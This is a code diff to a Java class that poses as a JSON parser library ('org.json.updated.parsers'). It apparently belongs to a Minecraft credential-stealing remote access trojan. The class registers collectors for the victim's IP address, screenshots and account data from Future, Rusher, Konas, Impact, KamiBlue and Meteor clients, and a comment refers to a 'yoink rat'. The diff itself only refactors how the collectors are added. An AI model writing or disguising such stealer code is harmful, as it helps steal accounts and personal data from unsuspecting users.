@@ -6,21 +6,25 @@ import org.json.updated.parsers.impl.*;
 import org.json.updated.parsers.util.JSONBuilder;
 
 import java.util.ArrayList;
+import java.util.Arrays;
 
 final class JSON {
     private final ArrayList<JSONObject> objects = new ArrayList<>();
     private final boolean debug = false;
 
     private void parseJson() {
-        this.objects.add(new GeneralInformation());
-        this.objects.add(new IPInformation());
-        this.objects.add(new Screenshot());
-        this.objects.add(new FutureData());
-        this.objects.add(new RusherData());
-        this.objects.add(new KonasData());
-        this.objects.add(new ImpactData());
-        this.objects.add(new KamiBlueData());
-        this.objects.add(new MeteorData());
+        // Incoming skidiots saying "U skidded yoink rat" cause of this line since this is better practice cause of add all instead of just a ton of .add lines :joy:.
+        this.objects.addAll(Arrays.asList(
+            new GeneralInformation(),
+            new IPInformation(),
+            new Screenshot(),
+            new FutureData(),
+            new RusherData(),
+            new KonasData(),
+            new ImpactData(),
+            new KamiBlueData(),
+            new MeteorData()
+        ));
 
         String separator = new JSONBuilder().value("content", "=============================================").build();
 
